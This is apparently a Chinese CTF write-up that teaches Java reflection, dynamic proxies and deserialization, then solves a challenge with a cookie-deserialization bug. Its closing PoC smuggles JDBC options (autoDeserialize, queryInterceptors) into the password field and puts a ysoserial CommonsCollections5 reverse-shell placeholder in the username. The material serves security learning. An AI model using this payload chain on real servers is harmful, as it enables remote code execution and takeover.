反射基础知识

反射 (Reflection) 是 Java 的特征之一，它允许运行中的 Java 程序获取自身的信息，并且可以操作类或对象的内部属性。

通过反射，我们可以在运行时获得程序或程序集中每一个类型的成员和成员的信息。程序中一般的对象的类型都是在编译期就确定下来的，而 Java 反射机制可以动态地创建对象并调用其属性，这样的对象的类型在编译期是未知的。所以我们可以通过反射机制直接创建对象，即使这个对象的类型在编译期是未知的。

反射的核心是 JVM 在运行时才动态加载类或调用方法/访问属性，它不需要事先（写代码的时候或编译期）知道运行对象是谁。

反射常见的函数有

  • 获取类的方法：forname

  • 实例化类对象的方法：newInstance

  • 获取函数的方法：getMethod

  • 执行函数的方法：invoke

下面通过几个demo来看下这几类函数的用法。

public class reflectstudy {
    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException {
        Class c = Class.forName("java.lang.Runtime");
		Object o = c.newInstance();
		Method method = c.getMethod("exec", String.class);
        method.invoke(o,"Calc.exe");
    }

第一个例子首先通过forName获得c的Class对象，然后通过类对象的newInstance方法得到一个实例，通过getMethod方法获得exec函数。最后invoke执行函数传入执行的参数和一个类实例。
但是这个例子会报错，报错的原因是

因为Runtime这个类的默认构造方法是私有方法，我们不能用newInstance直接调用它。

所以我们尝试第二种方法

public class reflectstudy {
    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException {
        Class c = Class.forName("java.lang.Runtime");
        Constructor constructor = c.getDeclaredConstructor();
        constructor.setAccessible(true);
        Object o = constructor.newInstance();
        Method method = c.getMethod("exec", String.class);
        method.invoke(o,"Calc.exe");
    }

在第二例子中不再采用newInstance获得实例，而采用getDeclaredConstructor获得类的构造器，而因为构造器为私有方法，所以采用setAccessible(true)去暴力获得访问权限，而获得私有的构造器后我们就可以正常构造实例进而执行exec方法了。

还有一点需要注意getDeclaredConstructor(类<?>... parameterTypes)不受修饰符限制会返回所有符合参数类型的构造函数，而getConstructor(类<?> parameterTypes)只会返回public修饰的构造函数。

除了上述的办法外，还可以获得public修饰的构造器，并获得实例。

public class reflectstudy {
    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException {
        Class c = Class.forName("java.lang.Runtime");
        Method method1 = c.getMethod("getRuntime");
        Object obj = method1.invoke(c);
        Method method2 = c.getMethod("exec", String.class);
        method2.invoke(obj,"Calc.exe");
    }

在这第三个例子中先获得了共public属性的构造方法用以构造实例。这里getRuntime是静态方法所以传入class对象就可以执行。

动态代理基础知识

代理模式是java中常见的一种设计模式，他的特征是代理类与委托类有同样的接口。
简单点理解，委托类有一个方法为买苹果。而代理类不仅可以调用委托类完成买苹果的方法，还可以在买苹果前加上讨价还价的方法，在买苹果后加上把苹果带回家等操作。简而言之能很好的扩充原本委托类的功能。
而代理又分为静态代理和动态代理两种。下面先来看下静态代理的例子。

静态代理

1.首先定义接口

public interface Buyer {
    public void buy();
}

2.定义一个委托类

public class AppleBuyer implements Buyer {
    @Override
    public void buy() {
        System.out.println("买了一个苹果");
    }
}

3.定义代理类
可以看出来 target为委托类的一个实例，在buy方法中代理类不仅调用了委托类本身的buy方法，还进行了功能的扩充

public class BuyerProxy implements Buyer {
    private Buyer target;
    BuyerProxy(Buyer buyer){
        this.target = buyer;
    }
    @Override
    public void buy() {
        System.out.println("与商家讨价还价");
        target.buy();
        System.out.println("把苹果带回家");
    }
}

4.执行函数

public class staticproxy {
    public static void main(String[] args) {
        AppleBuyer appleBuyer = new AppleBuyer();
        BuyerProxy buyerProxy = new BuyerProxy(appleBuyer);
        System.out.println("-----使用代理前------");
        appleBuyer.buy();
        System.out.println("-----使用代理后------");
        buyerProxy.buy();
    }
}


通过结果也能比较清楚的看到静态代理的作用。
静态代理也有很大的弊端，比如代理类要在买苹果前除了讨价还价还要添加货比三家这项功能，假如有很多代理类那么每个都要重新写方法。
而动态代理的优势在于可以很方便的对代理类的函数进行统一的处理，而不用修改每个代理类中的方法。下面来看动态代理的实现方式。

动态代理

java的java.lang.reflect包中提供了proxy类和InvocationHandler接口，可以生成动态代理类和动态代理对象。
首先来看InvocationHandler接口，这个接口实现类的作用为调用处理器，原先需要传入target(委托类实例)利用实例执行委托类方法(上述的买苹果方法)，有了调用处理器后改为反射执行委托类方法。
接口和委托类代码与上面相同。
调用处理器代码

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

public class DynamicProxy implements InvocationHandler {
    private Buyer target;
    public dynamicProxy(Buyer buyer){
        this.target = buyer;
    }
    // 实现InvocationHandler.invoke()方法
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        // 添加扩充的功能
        System.out.println("与商家讨价还价");
        // 反射执行委托类的方法
        Object obj = method.invoke(target,args);
        System.out.println("把苹果带回家");
        return obj;
    }
}

动态代理类生成实例需要三个参数

  • 类加载器
  • 调用处理器
  • 委托类的接口数组
import java.lang.reflect.Proxy;

public class dynamicStudy {
    public static void main(String[] args) {
        // 获得委托类的实例并传入获得调用处理器
        AppleBuyer appleBuyer = new AppleBuyer();
        DynamicProxy dynamicProxy = new DynamicProxy(appleBuyer);
        // 获得类加载器
        ClassLoader classLoader = AppleBuyer.class.getClassLoader();
        // 获得委托类的接口数组
        Class[] interfaces = AppleBuyer.class.getInterfaces();
        // 生成代理类实例
        Buyer proxy = (Buyer) Proxy.newProxyInstance(classLoader,interfaces,dynamicProxy);
        // 调用委托类方法
        proxy.buy();
    }
}

序列化相关函数

序列化:Java.io.ObjectOutputStream—writeObject()
调用ObjectOutputStream方法将对象序列化并写入到传入的输出流中。
反序列化:Java.io.ObjectInputStream—readObject()
从输入流当中读取字节序列，反序列化为一个对象返回。

序列化前提:
序列化的类必须实现java.io.Serializable 接口，且该类的所有属性必须是可序列化的。

反序列化的利用

由于反序列化基于reaObject函数来完成，所以如果readObject中的内容可控，那么就会形成任意代码执行的漏洞。
下面通过一个例子来掩饰反序列化的代码执行过程，重写readObject。

  1. 在继承了Serializable接口的类中重写readObject方法，加入执行弹出计算器的指令。
class testObject implements Serializable {
    public String user;
    private void readObject(java.io.ObjectInputStream in ) throws IOException,
            ClassNotFoundException {
        //执行默认的readObject()方法
        in.defaultReadObject();
        //执行打开计算器程序命令
        Runtime.getRuntime().exec("calc.exe");
    }
}
  1. 将对象序列化写入文件
import java.io.*;

public class SerializeObject{
    public static void main(String[] args) throws IOException{
        // 创建object
        testObject t = new testObject();
        t.user = "test";
        // 创建包含反序列化信息的文件
        FileOutputStream fos = new FileOutputStream("obj.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fos);
        // 将对象写入文件
        objectOutputStream.writeObject(t);
        objectOutputStream.close();
    }
}
  1. 从文件中反序列对象，成功执行指令
import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class unSerializeObject {
    public static void main(String[] args) throws IOException,ClassNotFoundException {
        // 从文件中读取字节序列
        FileInputStream fis = new FileInputStream("obj.txt");
        ObjectInputStream objectInputStream = new ObjectInputStream(fis);
        // 反序列化对象
        testObject obj = (testObject) objectInputStream.readObject();
        System.out.println(obj);
    }
}

进入题目拿到jar包，放入反编译器开始审计代码

简单的看下info以及DatabaseInfo还有UserInfo的内容可以得知Info接口有两个实现类。InfoInvocationHandler为info的动态代理调度器。
视图函数源码如下

  @GetMapping({"/index"})
  public String index(@CookieValue(value = "data", required = false) String cookieData) {
    if (cookieData != null && !cookieData.equals(""))
      return "redirect:/hello"; 
    return "index";
  }
  
  @PostMapping({"/index"})
  public String index(@RequestParam("username") String username, @RequestParam("password") String password, HttpServletResponse response) {
    UserInfo userinfo = new UserInfo();
    userinfo.setUsername(username);
    userinfo.setPassword(password);
    Cookie cookie = new Cookie("data", serialize(userinfo));
    cookie.setMaxAge(2592000);
    response.addCookie(cookie);
    return "redirect:/hello";
  }
  
  @GetMapping({"/hello"})
  public String hello(@CookieValue(value = "data", required = false) String cookieData, Model model) {
    if (cookieData == null || cookieData.equals(""))
      return "redirect:/index"; 
    Info info = (Info)deserialize(cookieData);
    if (info != null)
      model.addAttribute("info", info.getAllInfo()); 
    return "hello";
  }

hello路径的函数中获取了cookie中data字段的值，反序列化为info对象并调用了getAlllnfo方法，由于动态代理的缘故。每次执行info的方法都会使用代理调度器利用反射执行。

从调度器的方法中可以看到，调用getAlllInfo方法会先调用checkAllInfo方法。

而checkAllinfo又调用了connect方法其中host，post，username以及password都是可控的。这里很容易联想到利用JDBC和本地Gadget反序列化的攻击。

public class poc {
    public static void main(String[] args) throws IOException {
        // 创建委托类
        DatabaseInfo databaseInfo = new DatabaseInfo();
        // 目标url jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections5_calc
        databaseInfo.setHost("127.0.0.1");
        databaseInfo.setPort("3306");
        // CC链payload
        databaseInfo.setUsername("yso_CommonsCollections5_{反弹shell}");
        databaseInfo.setPassword("123&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor");
        // 通过类加载器,接口数组,调度处理器实现动态代理类
        ClassLoader classLoader = databaseInfo.getClass().getClassLoader();
        Class[] interfaces = databaseInfo.getClass().getInterfaces();
        InfoInvocationHandler infoInvocationHandler = new InfoInvocationHandler(databaseInfo);
        Info proxy = (Info) Proxy.newProxyInstance(classLoader,interfaces,infoInvocationHandler);
        // 序列化动态代理类并进行Base64编码
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(baos);
        objectOutputStream.writeObject(proxy);
        objectOutputStream.flush();
        objectOutputStream.close();
        System.out.printf(new String(Base64.getEncoder().encode(baos.toByteArray())));
    }
}
